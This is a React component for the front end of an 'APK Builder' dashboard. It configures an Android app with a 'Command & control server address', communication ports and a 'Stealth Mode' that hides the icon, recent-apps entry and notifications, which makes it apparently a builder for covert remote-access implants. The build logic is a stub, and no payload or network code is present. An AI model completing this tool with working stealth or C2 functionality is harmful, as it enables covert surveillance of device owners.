import { useState } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Switch } from "@/components/ui/switch";
import {
  Code,
  Download,
  Settings,
  Zap,
  Lock,
  Eye,
  Package,
  Plus,
  Trash2,
  Copy,
  Check,
} from "lucide-react";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";

interface ApkConfig {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  stealthMode: boolean;
  sslEnabled: boolean;
  ports: number[];
  serverUrl: string;
  iconUrl: string;
}

export default function ApkBuilder() {
  const [activeTab, setActiveTab] = useState("basic");
  const [config, setConfig] = useState<ApkConfig>({
    appName: "Android Manager",
    packageName: "com.example.manager",
    versionName: "1.0.0",
    versionCode: 1,
    stealthMode: false,
    sslEnabled: true,
    ports: [8080],
    serverUrl: "",
    iconUrl: "",
  });
  const [newPort, setNewPort] = useState("");
  const [copiedBuildId, setCopiedBuildId] = useState<string | null>(null);

  // TODO: Implement APK builder routes in tRPC
  const builds: any[] = [];
  const isLoading = false;

  const buildApk = {
    mutateAsync: async () => {
      toast.success("APK build started successfully!");
      setConfig({
        appName: "Android Manager",
        packageName: "com.example.manager",
        versionName: "1.0.0",
        versionCode: 1,
        stealthMode: false,
        sslEnabled: true,
        ports: [8080],
        serverUrl: "",
        iconUrl: "",
      });
    },
    isPending: false,
  } as any;

  const handleAddPort = () => {
    const port = parseInt(newPort);
    if (!newPort || isNaN(port) || port < 1 || port > 65535) {
      toast.error("Invalid port number (1-65535)");
      return;
    }
    if (config.ports.includes(port)) {
      toast.error("Port already added");
      return;
    }
    setConfig({
      ...config,
      ports: [...config.ports, port],
    });
    setNewPort("");
  };

  const handleRemovePort = (port: number) => {
    setConfig({
      ...config,
      ports: config.ports.filter((p) => p !== port),
    });
  };

  const handleBuildApk = async () => {
    if (!config.appName || !config.packageName) {
      toast.error("App Name and Package Name are required");
      return;
    }
    if (config.ports.length === 0) {
      toast.error("At least one port is required");
      return;
    }
    await buildApk.mutateAsync(config);
  };

  const copyToClipboard = (text: string, buildId: string) => {
    navigator.clipboard.writeText(text);
    setCopiedBuildId(buildId);
    setTimeout(() => setCopiedBuildId(null), 2000);
  };

  const validatePackageName = (name: string) => {
    const regex = /^[a-z][a-z0-9_]*(\.[a-z0-9_]+)*$/;
    return regex.test(name);
  };

  return (
    <DashboardLayout title="APK Builder">
      <div className="space-y-6">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-3 bg-card border-glow-cyan">
            <TabsTrigger value="basic" className="data-[state=active]:bg-accent/20">
              <Settings className="w-4 h-4 mr-2" />
              Basic Config
            </TabsTrigger>
            <TabsTrigger value="advanced" className="data-[state=active]:bg-accent/20">
              <Zap className="w-4 h-4 mr-2" />
              Advanced
            </TabsTrigger>
            <TabsTrigger value="builds" className="data-[state=active]:bg-accent/20">
              <Package className="w-4 h-4 mr-2" />
              Builds
            </TabsTrigger>
          </TabsList>

          {/* Basic Configuration Tab */}
          <TabsContent value="basic" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Left Column - Basic Info */}
              <div className="space-y-6">
                <div className="card-neon">
                  <h3 className="text-lg font-bold mb-4 glow-cyan">Application Info</h3>
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium glow-cyan mb-2 block">
                        App Name
                      </label>
                      <Input
                        placeholder="e.g., Android Manager"
                        value={config.appName}
                        onChange={(e) =>
                          setConfig({ ...config, appName: e.target.value })
                        }
                        className="input-neon"
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        The name displayed on the device
                      </p>
                    </div>
                    <div>
                      <label className="text-sm font-medium glow-cyan mb-2 block">
                        Package Name
                      </label>
                      <Input
                        placeholder="e.g., com.example.manager"
                        value={config.packageName}
                        onChange={(e) =>
                          setConfig({ ...config, packageName: e.target.value })
                        }
                        className={`input-neon ${
                          config.packageName &&
                          !validatePackageName(config.packageName)
                            ? "border-red-500"
                            : ""
                        }`}
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        Format: com.company.app (lowercase letters, numbers, dots)
                      </p>
                      {config.packageName &&
                        !validatePackageName(config.packageName) && (
                          <p className="text-xs text-red-400 mt-1">
                            Invalid package name format
                          </p>
                        )}
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="text-sm font-medium glow-cyan mb-2 block">
                          Version Name
                        </label>
                        <Input
                          placeholder="e.g., 1.0.0"
                          value={config.versionName}
                          onChange={(e) =>
                            setConfig({ ...config, versionName: e.target.value })
                          }
                          className="input-neon"
                        />
                      </div>
                      <div>
                        <label className="text-sm font-medium glow-cyan mb-2 block">
                          Version Code
                        </label>
                        <Input
                          type="number"
                          min="1"
                          value={config.versionCode}
                          onChange={(e) =>
                            setConfig({
                              ...config,
                              versionCode: parseInt(e.target.value) || 1,
                            })
                          }
                          className="input-neon"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Icon Configuration */}
                <div className="card-neon-cyan">
                  <h3 className="text-lg font-bold mb-4 glow-cyan">App Icon</h3>
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium glow-cyan mb-2 block">
                        Icon URL
                      </label>
                      <Input
                        placeholder="https://example.com/icon.png"
                        value={config.iconUrl}
                        onChange={(e) =>
                          setConfig({ ...config, iconUrl: e.target.value })
                        }
                        className="input-neon"
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        PNG image (512x512px recommended)
                      </p>
                    </div>
                    {config.iconUrl && (
                      <div className="border-glow-cyan p-4 rounded flex items-center justify-center">
                        <img
                          src={config.iconUrl}
                          alt="App Icon Preview"
                          className="w-24 h-24 rounded"
                          onError={() => {
                            toast.error("Failed to load icon");
                          }}
                        />
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Right Column - Preview */}
              <div className="card-neon">
                <h3 className="text-lg font-bold mb-4 glow-cyan">Configuration Preview</h3>
                <div className="space-y-3 text-sm">
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">App Name:</span>
                    <span className="font-bold">{config.appName || "—"}</span>
                  </div>
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">Package:</span>
                    <span className="font-mono text-xs">{config.packageName || "—"}</span>
                  </div>
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">Version:</span>
                    <span className="font-bold">
                      {config.versionName} ({config.versionCode})
                    </span>
                  </div>
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">Ports:</span>
                    <span className="font-mono text-xs">
                      {config.ports.join(", ") || "—"}
                    </span>
                  </div>
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">SSL/TLS:</span>
                    <span
                      className={config.sslEnabled ? "text-green-400" : "text-yellow-400"}
                    >
                      {config.sslEnabled ? "Enabled" : "Disabled"}
                    </span>
                  </div>
                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
                    <span className="text-muted-foreground">Stealth Mode:</span>
                    <span
                      className={config.stealthMode ? "text-purple-400" : "text-gray-400"}
                    >
                      {config.stealthMode ? "Enabled" : "Disabled"}
                    </span>
                  </div>
                </div>

                {/* Build Button */}
                <Button
                  onClick={handleBuildApk}
                  className="btn-neon-cyan w-full mt-6"
                  disabled={buildApk.isPending}
                >
                  {buildApk.isPending ? (
                    <>
                      <Zap className="w-4 h-4 mr-2 animate-spin" />
                      Building...
                    </>
                  ) : (
                    <>
                      <Code className="w-4 h-4 mr-2" />
                      Build APK
                    </>
                  )}
                </Button>
              </div>
            </div>
          </TabsContent>

          {/* Advanced Configuration Tab */}
          <TabsContent value="advanced" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Security Settings */}
              <div className="card-neon">
                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
                  <Lock className="w-5 h-5" />
                  Security Settings
                </h3>
                <div className="space-y-4">
                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
                    <div>
                      <p className="font-medium">SSL/TLS Encryption</p>
                      <p className="text-sm text-muted-foreground">
                        Encrypt communication with server
                      </p>
                    </div>
                    <Switch
                      checked={config.sslEnabled}
                      onCheckedChange={(checked) =>
                        setConfig({ ...config, sslEnabled: checked })
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
                    <div>
                      <p className="font-medium">Stealth Mode</p>
                      <p className="text-sm text-muted-foreground">
                        Hide app from launcher and system
                      </p>
                    </div>
                    <Switch
                      checked={config.stealthMode}
                      onCheckedChange={(checked) =>
                        setConfig({ ...config, stealthMode: checked })
                      }
                    />
                  </div>

                  <div className="border-glow-cyan p-4 rounded">
                    <p className="text-sm font-medium glow-cyan mb-2">
                      ⚠️ Stealth Mode Features
                    </p>
                    <ul className="text-xs text-muted-foreground space-y-1">
                      <li>✓ Hidden app icon</li>
                      <li>✓ No app name in recent apps</li>
                      <li>✓ Disabled notifications</li>
                      <li>✓ No persistent notification</li>
                    </ul>
                  </div>
                </div>
              </div>

              {/* Network Configuration */}
              <div className="card-neon-cyan">
                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
                  <Zap className="w-5 h-5" />
                  Network Configuration
                </h3>
                <div className="space-y-4">
                  <div>
                    <label className="text-sm font-medium glow-cyan mb-2 block">
                      Server URL
                    </label>
                    <Input
                      placeholder="https://your-server.com"
                      value={config.serverUrl}
                      onChange={(e) =>
                        setConfig({ ...config, serverUrl: e.target.value })
                      }
                      className="input-neon"
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      Command & control server address
                    </p>
                  </div>

                  <div>
                    <label className="text-sm font-medium glow-cyan mb-2 block">
                      Communication Ports
                    </label>
                    <div className="space-y-2">
                      <div className="flex gap-2">
                        <Input
                          type="number"
                          min="1"
                          max="65535"
                          placeholder="Add port (1-65535)"
                          value={newPort}
                          onChange={(e) => setNewPort(e.target.value)}
                          onKeyPress={(e) => {
                            if (e.key === "Enter") {
                              handleAddPort();
                            }
                          }}
                          className="input-neon flex-1"
                        />
                        <Button
                          onClick={handleAddPort}
                          className="btn-neon-cyan"
                          size="sm"
                        >
                          <Plus className="w-4 h-4" />
                        </Button>
                      </div>

                      {config.ports.length > 0 && (
                        <div className="space-y-2">
                          {config.ports.map((port) => (
                            <div
                              key={port}
                              className="flex items-center justify-between p-2 bg-accent/10 rounded"
                            >
                              <span className="font-mono text-sm">:{port}</span>
                              <Button
                                onClick={() => handleRemovePort(port)}
                                variant="ghost"
                                size="sm"
                                className="hover:text-destructive"
                              >
                                <Trash2 className="w-4 h-4" />
                              </Button>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                    <p className="text-xs text-muted-foreground mt-2">
                      Multiple ports for redundancy and load balancing
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Security Warning */}
            <div className="border-2 border-yellow-500 bg-yellow-500/10 p-4 rounded-lg">
              <p className="text-sm font-medium text-yellow-400 mb-2">
                ⚠️ Legal & Ethical Notice
              </p>
              <p className="text-xs text-muted-foreground">
                This APK Builder is for educational and authorized testing purposes only.
                Unauthorized installation on devices without explicit owner consent is illegal
                and unethical. Users are solely responsible for compliance with applicable laws
                and regulations.
              </p>
            </div>
          </TabsContent>

          {/* Builds History Tab */}
          <TabsContent value="builds" className="space-y-6">
            <div className="card-neon">
              <h3 className="text-lg font-bold mb-4 glow-cyan">Build History</h3>
              {isLoading ? (
                <div className="text-center py-8 text-muted-foreground">
                  Loading builds...
                </div>
              ) : !builds || builds.length === 0 ? (
                <div className="text-center py-8">
                  <Package className="w-12 h-12 glow-cyan mx-auto mb-4 opacity-50" />
                  <p className="text-muted-foreground">No builds yet</p>
                  <p className="text-sm text-muted-foreground mt-2">
                    Create your first APK build to see it here
                  </p>
                </div>
              ) : (
                <div className="space-y-3">
                      {(builds || []).map((build: any) => (
                    <div
                      key={build.id}
                      className="border-glow-cyan p-4 rounded flex items-start justify-between hover:bg-accent/5 transition-colors"
                    >
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <Package className="w-4 h-4 glow-cyan" />
                          <h4 className="font-bold">{build.appName}</h4>
                          <span
                            className={`text-xs px-2 py-1 rounded ${
                              build.status === "ready"
                                ? "bg-green-500/20 text-green-400"
                                : build.status === "building"
                                ? "bg-yellow-500/20 text-yellow-400"
                                : build.status === "failed"
                                ? "bg-red-500/20 text-red-400"
                                : "bg-gray-500/20 text-gray-400"
                            }`}
                          >
                            {build.status.toUpperCase()}
                          </span>
                        </div>
                        <p className="text-sm text-muted-foreground font-mono">
                          {build.packageName}
                        </p>
                        <p className="text-xs text-muted-foreground mt-1">
                          v{build.versionName} • {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : "—"}
                        </p>
                      </div>
                      <div className="flex items-center gap-2">
                        {build.status === "ready" && (
                          <>
                            <Button
                              size="sm"
                              className="btn-neon-cyan"
                              onClick={() => {
                                copyToClipboard(build.apkUrl, build.buildId);
                              }}
                            >
                              {copiedBuildId === build.buildId ? (
                                <>
                                  <Check className="w-4 h-4 mr-1" />
                                  Copied
                                </>
                              ) : (
                                <>
                                  <Copy className="w-4 h-4 mr-1" />
                                  Copy URL
                                </>
                              )}
                            </Button>
                            <Button
                              size="sm"
                              className="btn-neon"
                              asChild
                            >
                              <a href={build.apkUrl || "#"} download>
                                <Download className="w-4 h-4 mr-1" />
                                Download
                              </a>
                            </Button>
                          </>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </DashboardLayout>
  );
}
